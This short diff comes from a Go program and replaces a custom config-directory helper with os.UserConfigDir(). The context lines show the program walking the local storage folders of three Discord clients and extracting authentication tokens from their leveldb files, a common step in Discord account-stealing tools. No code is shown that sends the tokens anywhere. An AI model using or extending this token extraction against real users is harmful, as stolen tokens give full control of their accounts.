@@ -18,12 +18,12 @@ func init() {
 var versions = []string{"discord", "discordcanary", "discordptb"}
 
 func main() {
-	confighome, err := confighome()
+	configDir, err := os.UserConfigDir()
 	if err != nil {
 		log.Fatalln(err)
 	}
 	for _, ver := range versions {
-		path := filepath.Join(confighome,
+		path := filepath.Join(configDir,
 			ver, "Local Storage/leveldb")
 		tok := tokenFromLevelDB(path)
 		if tok != "" {
